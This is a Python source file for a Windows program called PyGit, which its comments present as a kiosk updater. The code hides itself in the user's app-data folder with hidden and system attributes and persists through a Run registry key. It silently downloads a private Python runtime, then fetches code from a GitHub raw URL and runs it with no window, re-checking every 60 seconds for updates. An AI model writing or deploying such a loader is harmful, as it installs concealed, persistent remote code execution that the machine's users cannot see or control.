import ast
import ctypes
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import zipfile
import winreg

APP_NAME = "PyGit"
CHECK_INTERVAL = 60
PYTHON_VERSION = "3.12.10"
PYTHON_RUNTIME_URL = (
    "https://www.python.org/ftp/python/3.12.10/"
    "python-3.12.10-embed-amd64.zip"
)
GITHUB_RAW = "https://raw.githubusercontent.com/royalguard14/PyGit/main/"

LOCAL_APP_DATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~"))
APP_DIR = os.path.join(LOCAL_APP_DATA, APP_NAME)
RUNTIME_DIR = os.path.join(APP_DIR, ".pygit_runtime")
PYTHON_RUNTIME_DIR = os.path.join(APP_DIR, ".pygit_python")

RUNTIME_CODE = os.path.join(RUNTIME_DIR, "code.py")
RUNTIME_CONTROL = os.path.join(RUNTIME_DIR, "control.json")
BACKUP_CODE = os.path.join(RUNTIME_DIR, "code.previous.py")
LOG_FILE = os.path.join(RUNTIME_DIR, "pygit.log")

PYTHON_EXE = os.path.join(PYTHON_RUNTIME_DIR, "python.exe")
PYTHONW_EXE = os.path.join(PYTHON_RUNTIME_DIR, "pythonw.exe")
INSTALLED_EXE = os.path.join(APP_DIR, "PyGit.exe")

# Import name -> PyPI package name for the common cases where they differ.
PACKAGE_MAP = {
    "PIL": "Pillow",
    "cv2": "opencv-python",
    "bs4": "beautifulsoup4",
    "yaml": "PyYAML",
    "serial": "pyserial",
    "sklearn": "scikit-learn",
}

def hide_path(path):
    try:
        FILE_ATTRIBUTE_HIDDEN = 0x02
        FILE_ATTRIBUTE_SYSTEM = 0x04
        ctypes.windll.kernel32.SetFileAttributesW(
            str(path),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        )
    except Exception:
        pass


def log(message):
    # Diagnostics stay inside the hidden PyGit folder.
    try:
        os.makedirs(RUNTIME_DIR, exist_ok=True)
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(
                f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n"
            )
    except Exception:
        pass


def get_remote(path):
    url = GITHUB_RAW + path.lstrip("/") + "?_=" + str(time.time_ns())
    request = urllib.request.Request(
        url,
        headers={
            "User-Agent": "PyGit-Live/3.0",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
        },
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        return response.read().decode("utf-8")


def parse_version(version):
    try:
        return tuple(int(x) for x in str(version).split("."))
    except (ValueError, AttributeError):
        return (0,)


def save_file(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, temp_path = tempfile.mkstemp(
        prefix=".pygit_", dir=os.path.dirname(path), text=True
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(content)
        os.replace(temp_path, path)
    except Exception:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        raise


def load_local_control():
    try:
        with open(RUNTIME_CONTROL, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return None


def get_python_command():
    if os.path.exists(PYTHON_EXE):
        return [PYTHON_EXE]
    return [sys.executable]


def get_pythonw_command():
    if os.path.exists(PYTHONW_EXE):
        return [PYTHONW_EXE]
    return get_python_command()


def bootstrap_private_python():
    if os.path.exists(PYTHON_EXE):
        return

    log(f"Installing private Python {PYTHON_VERSION}")
    os.makedirs(PYTHON_RUNTIME_DIR, exist_ok=True)

    fd, archive_path = tempfile.mkstemp(
        prefix=".pygit_python_", suffix=".zip", dir=APP_DIR
    )
    os.close(fd)

    try:
        request = urllib.request.Request(
            PYTHON_RUNTIME_URL,
            headers={"User-Agent": "PyGit-Live/3.0"},
        )
        with urllib.request.urlopen(request, timeout=90) as response:
            with open(archive_path, "wb") as out:
                shutil.copyfileobj(response, out)

        with zipfile.ZipFile(archive_path, "r") as archive:
            archive.extractall(PYTHON_RUNTIME_DIR)

        if not os.path.exists(PYTHON_EXE):
            raise RuntimeError("Private Python installation failed.")

        pth_files = [
            x for x in os.listdir(PYTHON_RUNTIME_DIR)
            if x.endswith("._pth")
        ]
        if not pth_files:
            raise RuntimeError("Python embeddable ._pth file not found.")

        pth_path = os.path.join(PYTHON_RUNTIME_DIR, pth_files[0])
        with open(pth_path, "r", encoding="utf-8") as f:
            lines = f.read().splitlines()

        if "Lib\\site-packages" not in lines:
            lines.insert(0, "Lib\\site-packages")
        if "import site" not in lines:
            lines.append("import site")

        save_file(pth_path, "\n".join(lines) + "\n")

        get_pip_path = os.path.join(PYTHON_RUNTIME_DIR, "get-pip.py")
        request = urllib.request.Request(
            "https://bootstrap.pypa.io/get-pip.py",
            headers={"User-Agent": "PyGit-Live/3.0"},
        )
        with urllib.request.urlopen(request, timeout=90) as response:
            with open(get_pip_path, "wb") as out:
                shutil.copyfileobj(response, out)

        result = subprocess.run(
            [PYTHON_EXE, get_pip_path, "--disable-pip-version-check"],
            cwd=APP_DIR,
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
        )
        if result.returncode != 0:
            raise RuntimeError("Private pip installation failed.")

        os.remove(get_pip_path)
        hide_path(PYTHON_RUNTIME_DIR)
        log("Private Python ready.")

    except Exception:
        shutil.rmtree(PYTHON_RUNTIME_DIR, ignore_errors=True)
        raise
    finally:
        if os.path.exists(archive_path):
            os.remove(archive_path)


def extract_imports(code):
    tree = ast.parse(code)
    modules = set()

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                modules.add(alias.name.split(".")[0])
        elif isinstance(node, ast.ImportFrom) and node.level == 0:
            if node.module:
                modules.add(node.module.split(".")[0])

    return modules


def install_missing_dependencies(code):
    # Python has no built-in "install this module when import fails" behavior.
    # PyGit provides that behavior by inspecting imports before starting code.py.
    try:
        stdlib = sys.stdlib_module_names
    except AttributeError:
        stdlib = set()

    missing = []

    for module in sorted(extract_imports(code)):
        if module in stdlib:
            continue

        try:
            # Check the private runtime, not the PyInstaller build environment.
            probe = subprocess.run(
                get_python_command()
                + [
                    "-c",
                    "import importlib.util,sys; "
                    "sys.exit(0 if importlib.util.find_spec(sys.argv[1]) "
                    "is not None else 1)",
                    module,
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )
            if probe.returncode != 0:
                missing.append(PACKAGE_MAP.get(module, module))
        except Exception:
            missing.append(PACKAGE_MAP.get(module, module))

    if not missing:
        return

    log("Installing missing modules: " + ", ".join(missing))

    result = subprocess.run(
        get_python_command()
        + [
            "-m",
            "pip",
            "install",
            "--disable-pip-version-check",
            *missing,
        ],
        cwd=APP_DIR,
        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
    )

    if result.returncode != 0:
        raise RuntimeError(
            "One or more application dependencies could not be installed."
        )

    log("Missing modules installed.")


def validate_code(code):
    compile(code, RUNTIME_CODE, "exec")


def install_remote(remote_control, remote_code):
    validate_code(remote_code)
    install_missing_dependencies(remote_code)

    os.makedirs(RUNTIME_DIR, exist_ok=True)

    if os.path.exists(RUNTIME_CODE):
        shutil.copy2(RUNTIME_CODE, BACKUP_CODE)

    save_file(RUNTIME_CODE, remote_code)
    save_file(
        RUNTIME_CONTROL,
        json.dumps(remote_control, indent=2) + "\n",
    )

    hide_path(RUNTIME_DIR)


def ensure_runtime():
    os.makedirs(APP_DIR, exist_ok=True)
    os.makedirs(RUNTIME_DIR, exist_ok=True)
    hide_path(APP_DIR)
    hide_path(RUNTIME_DIR)

    control = load_local_control()

    if control and os.path.exists(RUNTIME_CODE):
        return control

    remote_control = json.loads(get_remote("control.json"))
    remote_code = get_remote(remote_control["code"])
    install_remote(remote_control, remote_code)
    return remote_control


def start_code(control):
    # pythonw.exe means no console window is created for the kiosk application.
    return subprocess.Popen(
        get_pythonw_command() + [RUNTIME_CODE],
        cwd=APP_DIR,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
    )


def stop_code(process):
    if process and process.poll() is None:
        process.terminate()
        try:
            process.wait(timeout=3)
        except subprocess.TimeoutExpired:
            process.kill()


def check_for_update(current_control):
    remote_control = json.loads(get_remote("control.json"))

    if parse_version(remote_control["version"]) <= parse_version(
        current_control.get("version", "0.0.0")
    ):
        return current_control, False

    remote_code = get_remote(remote_control["code"])
    install_remote(remote_control, remote_code)

    return remote_control, True


def install_startup():
    # Start PyGit automatically when the kiosk user signs in.
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        ) as key:
            winreg.SetValueEx(
                key,
                "PyGit",
                0,
                winreg.REG_SZ,
                f'"{INSTALLED_EXE}"',
            )
    except Exception as e:
        log(f"Startup registration failed: {e}")


def self_install():
    if not getattr(sys, "frozen", False):
        return

    os.makedirs(APP_DIR, exist_ok=True)
    hide_path(APP_DIR)

    current_exe = os.path.abspath(sys.executable)
    installed_exe = os.path.abspath(INSTALLED_EXE)

    if current_exe.lower() != installed_exe.lower():
        shutil.copy2(current_exe, installed_exe)
        hide_path(installed_exe)
        install_startup()

        subprocess.Popen(
            [installed_exe],
            cwd=APP_DIR,
            creationflags=getattr(subprocess, "DETACHED_PROCESS", 0)
            | getattr(subprocess, "CREATE_NO_WINDOW", 0),
            close_fds=True,
        )
        raise SystemExit

    install_startup()


def main():
    self_install()
    bootstrap_private_python()

    process = None

    try:
        control = ensure_runtime()
        process = start_code(control)

        while True:
            time.sleep(CHECK_INTERVAL)

            try:
                new_control, updated = check_for_update(control)

                if updated:
                    stop_code(process)
                    control = new_control
                    process = start_code(control)

                elif process.poll() is not None:
                    # Keep the supervisor alive silently.
                    process = start_code(control)

            except Exception as e:
                # GitHub/network failures never stop the local kiosk application.
                log(f"Update check failed: {e}")

    except Exception as e:
        log(f"Startup failed: {e}")
        stop_code(process)


if __name__ == "__main__":
    main()
